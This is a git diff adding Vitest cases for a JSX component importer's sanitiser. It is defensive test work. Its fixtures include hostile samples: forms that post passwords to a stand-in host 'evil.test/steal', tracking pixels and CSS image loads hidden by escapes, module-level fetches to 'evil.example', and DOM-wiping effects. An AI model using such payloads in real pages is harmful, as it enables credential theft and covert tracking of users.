@@ -7,7 +7,6 @@ import { renderToStaticMarkup } from 'react-dom/server';
 import { describe, expect, it } from 'vitest';
 import { renderComponentNode } from '@/lib/renderer/server/renderComponentNode';
 import type { ComponentNode } from '@/lib/renderer/publish/hydrateBindings';
-import { jsxToNodes } from '../jsx';
 import { DETAILS, type ImportLine } from '../report';
 import { importSource } from '../source';
 
@@ -248,14 +247,238 @@ describe('the ledger is total', () => {
   });
 });
 
-describe('the normal form keeps its own language', () => {
-  it('still reads islands, bindings and rules', () => {
-    expect(jsxToNodes('<Form as="section"><p>x</p></Form>').node?.type).toBe('section');
-    expect(jsxToNodes('<div className="a" />').node?.props).toMatchObject({ className: 'a' });
+const verdict = (text: string) => run(text).report.verdict;
+
+describe('a name in another case', () => {
+  it.each([
+    ['<form ACTION="http://evil.test/steal"><input name="pw" /><button>go</button></form>'],
+    ['<form Action="http://evil.test/steal" />'],
+    ['<form ONSUBMIT="x" />'],
+    ['<img ID="createElement" name="x" src="a.png" />'],
+    ['<img Id="querySelector" name="x" src="a.png" />'],
+    ['<div CLASS="fixed inset-0 z-50">x</div>'],
+    ['<div classname="fixed inset-0" />'],
+    ['<div ClassName="fixed inset-0" />'],
+    ['<div STYLE={{ background: "url(http://evil.test/a.png)" }} />'],
+    ['<div Style={{ color: "red" }} />'],
+    ['<div CHILDREN={{ type: "script", props: {} }} />'],
+    ['<div KEY="x" />'],
+    ['<div REF="x" />'],
+    ['<a ACTION="x" />'],
+    ['<button FORMACTION="http://evil.test/" />'],
+    ['<input FoRm="f" />'],
+  ])('%s', (text) => {
+    expect(verdict(text)).toBe('not-imported');
   });
 
-  it('refuses a hostile input rather than throwing', () => {
-    expect(jsxToNodes(`${'<div>'.repeat(50_000)}${'</div>'.repeat(50_000)}`).leftOver).toEqual(['nested too deeply to read safely']);
-    expect(jsxToNodes('a+'.repeat(100_000) + 'a').leftOver).toEqual(['nested too deeply to read safely']);
+  it('stores nothing a keyed name carries', () => {
+    expect(run('<div><img ID="createElement" /></div>').root?.children?.[0]?.props).not.toHaveProperty('ID');
+    expect(run('<div CLASS="fixed" />').root?.props).not.toHaveProperty('CLASS');
+    expect(run('<div STYLE={{ color: "red" }} />').root?.props).not.toHaveProperty('STYLE');
   });
+
+  it('keeps the case of a name SVG needs', () => {
+    const { root, report } = run('<svg viewBox="0 0 10 10" fill="none"><title>x</title><path d="M0 0" stroke="currentColor" strokeWidth={2} /></svg>');
+    expect(report.verdict).toBe('imported');
+    expect(root?.props).toHaveProperty('viewBox', '0 0 10 10');
+    expect(root?.children?.[1].props).toHaveProperty('strokeWidth', 2);
+  });
+
+  it('reads a tag in any case the same way', () => {
+    expect(verdict('<BR>x</BR>')).toBe('not-imported');
+    expect(verdict('<bR>x</bR>')).toBe('not-imported');
+    expect(verdict('<iNpUt>x</iNpUt>')).toBe('not-imported');
+    expect(verdict('<tAbLe>x</tAbLe>')).toBe('not-imported');
+    expect(verdict('<sVg><script /></sVg>')).toBe('not-imported');
+    expect(verdict('<fOrM action="/x" />')).toBe('not-imported');
+    expect(verdict('<sVg><title>hi</title></sVg>')).toBe('imported');
+  });
+});
+
+describe('form logic off the form', () => {
+  it.each([
+    ['formAction', '<form><input name="pw" /><button formAction="http://evil.test/steal">go</button></form>'],
+    ['formMethod', '<button formMethod="post">go</button>'],
+    ['formTarget', '<button formTarget="_blank">go</button>'],
+    ['formEncType', '<button formEncType="text/plain">go</button>'],
+    ['form, joining one from anywhere', '<div><input form="other" name="pw" /></div>'],
+    ['form on a button', '<button form="other">go</button>'],
+    ['lower case', '<button formaction="http://evil.test/">go</button>'],
+  ])('%s', (_name, text) => {
+    const { report } = run(text);
+    expect(report.verdict).toBe('not-imported');
+    expect(report.lines.find((line) => line.detail === DETAILS.form)).toMatchObject({ kind: 'element', disposition: 'left' });
+  });
+
+  it('leaves a plain form with plain controls alone', () => {
+    expect(verdict('<form><input name="pw" /><button>go</button></form>')).toBe('imported');
+  });
+});
+
+describe('a planted external address', () => {
+  const external = (text: string) => run(text).report.lines.find((line) => line.kind === 'external-address');
+
+  it.each([
+    ['plain', String.raw`<div style={{ background: "url(http://evil.test/a.png)" }} />`],
+    ['with no scheme', String.raw`<div style={{ background: "url(//evil.test/a.png)" }} />`],
+    ['quoted', String.raw`<div style={{ background: 'url("http://evil.test/a.png")' }} />`],
+    ['after a space', String.raw`<div style={{ background: "url(  http://evil.test/a.png)" }} />`],
+    ['behind a first image', String.raw`<div style={{ background: "url(x.png), url(http://evil.test/a.png)" }} />`],
+    ['second in an image-set', String.raw`<div style={{ backgroundImage: 'image-set("x.png" 9x, "http://evil.test/b.png" 1x)' }} />`],
+    ['second in a webkit image-set', String.raw`<div style={{ backgroundImage: '-webkit-image-set("x.png" 9x, "http://evil.test/b.png" 1x)' }} />`],
+    ['through a custom property', String.raw`<div style={{ "--u": '"http://evil.test/c.png"', backgroundImage: "image-set(var(--u) 1x)" }} />`],
+    ['indirect, with the property elsewhere', String.raw`<div style={{ backgroundImage: "image-set(var(--u) 1x)" }} />`],
+    ['in a cross-fade', String.raw`<div style={{ backgroundImage: 'cross-fade("http://evil.test/cf.png" 50%, "x.png")' }} />`],
+    ['an escape inside a string', String.raw`<div style={{ background: 'url("\\68ttp://evil.test/a.png")' }} />`],
+    ['an image', '<img src="http://evil.test/pixel.gif" />'],
+    ['an image with no scheme', '<img src="//evil.test/pixel.gif" />'],
+    ['a source set', '<img srcSet="/a.png 1x, http://evil.test/p.gif 2x" />'],
+    ['a video', '<video src="http://evil.test/v.mp4" />'],
+    ['a poster', '<video poster="http://evil.test/p.gif" />'],
+    ['an svg use', '<svg><use href="http://evil.test/s.svg#a" /></svg>'],
+    ['an svg image', '<svg><image href="http://evil.test/a.png" /></svg>'],
+    ['a constant', 'const a = "http://evil.test/p.gif";\n<img src={a} />'],
+    ['a name in another case', '<img SRC="http://evil.test/p.gif" />'],
+  ])('%s needs an accept', (_name, text) => {
+    expect(external(text)).toMatchObject({ disposition: 'adapted', next: ['accept'] });
+    expect(verdict(text)).toBe('imported-with-differences');
+  });
+
+  it.each([
+    ['in the name', String.raw`<div style={{ background: "u\\72l(http://evil.test/a.png)" }} />`],
+    ['in the address', String.raw`<div style={{ background: "url(\\68ttp://evil.test/a.png)" }} />`],
+    ['a raw newline in a string', String.raw`<div style={{ background: 'url("a\nb")' }} />`],
+  ])('refuses a value hidden from the scan, %s', (_name, text) => {
+    const line = lineOf(text, DETAILS.refusedStyle);
+    expect(line).toMatchObject({ kind: 'refused-attribute', disposition: 'left' });
+  });
+
+  it.each([
+    ['a local image', '<img src="/a.png" alt="" />'],
+    ['a relative one', '<img src="a.png" srcSet="a.png 1x, b.png 2x" />'],
+    ['a data image', '<img src="data:image/png;base64,AAAA" />'],
+    ['a link', '<a href="https://example.test/">x</a>'],
+    ['a fragment in svg', '<svg><use href="#a" /></svg>'],
+    ['a local style image', '<div style={{ background: "url(/a.png)" }} />'],
+    ['an escape in a string that means nothing here', String.raw`<p style={{ quotes: '"\\201C" "\\201D"' }} />`],
+  ])('%s stays clean', (_name, text) => {
+    expect(verdict(text)).toBe('imported');
+  });
+});
+
+describe('a statement that can change what renders', () => {
+  const writer = (body: string) => `const o = { a: "before" };\n${body}\nexport default function A() { return <div title={o.a} />; }`;
+
+  it.each([
+    ['an alias', 'const p = o;\np.a = "after";'],
+    ['an array pattern', '[o.a] = ["after"];'],
+    ['an object pattern', '({ x: o.a } = { x: "after" });'],
+    ['a for target', 'for (o.a of ["after"]);'],
+    ['a for-in target', 'for (o.a in { after: 1 });'],
+    ['new', 'new Mutate(o);'],
+    ['a tagged template', 'mutate`${o}`;'],
+    ['an assignment', 'o.a = "after";'],
+    ['an assignment in a declaration', 'const z = (o.a = "after");'],
+  ])('%s stores no stale value', (_name, body) => {
+    const { report, root } = run(writer(body));
+    expect(report.verdict).toBe('not-imported');
+    expect(root?.props).not.toHaveProperty('title', 'before');
+  });
+
+  it.each([
+    ['a bare import', 'import "evil-package";\nexport default function A() { return <div />; }'],
+    ['a call at module level', 'fetch("https://evil.example/");\nexport default function A() { return <div />; }'],
+    ['a write at module level', 'document.title = "x";\nexport default function A() { return <div />; }'],
+    ['a call in a module constant', 'const x = track();\nexport default function A() { return <div />; }'],
+    ['new in a module constant', 'const x = new Thing();\nexport default function A() { return <div />; }'],
+    ['an effect kept in a constant', 'export default function A() { const a = useLayoutEffect(() => { document.body.innerHTML = ""; }); return <div />; }'],
+    ['state nobody reads', 'export default function A() { const [x, setX] = useState(0); return <div />; }'],
+    ['a write in a declaration', 'export default function A() { const a = (document.title = "x"); return <div />; }'],
+    ['await', 'export default function A() { const a = await b; return <div />; }'],
+    ['in front of a fragment', 'document.title = "x";\n<div />'],
+    ['a class with a computed base', 'class A extends mixin() {}\n<div />'],
+  ])('%s blocks placing', (_name, text) => {
+    const { report } = run(text);
+    expect(report.verdict).toBe('not-imported');
+    expect(report.lines.some((line) => line.detail === DETAILS.leftInTree)).toBe(true);
+  });
+
+  it.each([
+    ['a display name', 'export default function Button() { return <button>x</button>; }\nButton.displayName = "Button";'],
+    ['a directive', '"use client";\nexport default function A() { return <div />; }'],
+    ['imports and types', 'import * as React from "react";\ntype Props = { label?: string };\ninterface P {}\nexport default function A() { return <div />; }'],
+    ['a function that holds a call, which has not run', 'const h = () => fetch("/x");\nfunction g() { fetch("/x"); }\nexport default function A() { return <div />; }'],
+    ['an export list', 'function A() { return <div />; }\nexport { A };'],
+  ])('%s does not block', (_name, text) => {
+    expect(verdict(text)).toBe('imported');
+  });
+
+  it('claims only what it knows about a left line', () => {
+    const line = run('function C(title) { return <p>{title}</p>; }').report.lines.find((each) => each.excerpt === 'title' && each.nodeKey === undefined);
+    expect(line?.detail).toBe(DETAILS.left);
+    expect(DETAILS.left).not.toMatch(/reads/);
+  });
+});
+
+describe('what a real component stays', () => {
+  it('a button with a style, an entity and a display name', () => {
+    const text = 'import * as React from "react";\ntype Props = { label?: string };\nexport default function Button() {\n  return (\n    <button type="button" aria-label="Save" style={{ padding: 8, color: "red" }}>\n      Save &amp; close\n    </button>\n  );\n}\nButton.displayName = "Button";';
+    expect(verdict(text)).toBe('imported');
+  });
+
+  it('an arrow component', () => {
+    expect(verdict('const Card = () => (\n  <article>\n    <h2>Title</h2>\n    <p>Text {"more"}</p>\n    <img src="/a.png" alt="" />\n  </article>\n);\nexport default Card;')).toBe('imported');
+  });
+
+  it('two roots, with the wrapper said', () => {
+    expect(verdict('<>\n  <h1>Hello</h1>\n  <p>World</p>\n</>')).toBe('imported-with-differences');
+  });
+});
+
+describe('platform attributes the editor reads', () => {
+  it.each(['data-ground-wrapper-id', 'data-editor-ui', 'data-breakpoint-id', 'data-viewport-id', 'data-ground', 'data-floating-root-id', 'data-preview-frame', 'data-fx-a', 'data-fx-st', 'data-fx-p', 'data-fx-in', 'data-fx-on'])('%s', (name) => {
+    expect(lineOf(`<div ${name}="x" />`, DETAILS.platformAttribute)).toMatchObject({ kind: 'refused-attribute' });
+    expect(lineOf(`<div ${name.toUpperCase()}="x" />`, DETAILS.platformAttribute)).toBeDefined();
+  });
+
+  it('leaves an author own data attribute alone', () => {
+    expect(verdict('<div data-state="open" data-slot="x" data-testid="y" />')).toBe('imported');
+  });
+});
+
+describe('values with no stored form', () => {
+  it.each([['<p>{1e999}</p>'], ['<p>{-1e999}</p>'], ['<i tabIndex={1e999} />']])('%s', (text) => {
+    expect(verdict(text)).toBe('not-imported');
+  });
+});
+
+describe('a stylesheet beside the component', () => {
+  it('blocks until a sheet is read', () => {
+    const { report, root } = importSource([{ name: 'a.tsx', text: '<div />' }, { name: 'a.css', text: 'div{display:none}' }]);
+    expect(root?.type).toBe('div');
+    expect(report.verdict).toBe('not-imported');
+    expect(report.lines.find((line) => line.detail === DETAILS.stylesheet)?.nodeKey).toBe('n-0');
+  });
+
+  it('does not block for a file that cannot style anything', () => {
+    expect(importSource([{ name: 'a.tsx', text: '<div />' }, { name: 'a.png', text: 'xx' }]).report.verdict).toBe('imported');
+  });
+});
+
+describe('the output depth', () => {
+  const deep = (levels: number, each: number) => {
+    const lines = Array.from({ length: levels }, (_, i) => `function C${i}() { return ${'<b>'.repeat(each)}${i + 1 < levels ? `<C${i + 1} />` : ''}${'</b>'.repeat(each)}; }`);
+    return `${lines.join('\n')}\n<C0 />`;
+  };
+
+  it('counts what inlining multiplies', () => {
+    const { report, root } = run(deep(16, 240));
+    expect(root).toBeUndefined();
+    expect(report.lines.find((line) => line.detail === DETAILS.overDepth)?.kind).toBe('cap');
+  });
+
+  it('takes what fits', () => {
+    expect(verdict(deep(2, 100))).toBe('imported');
+  });
+
 });
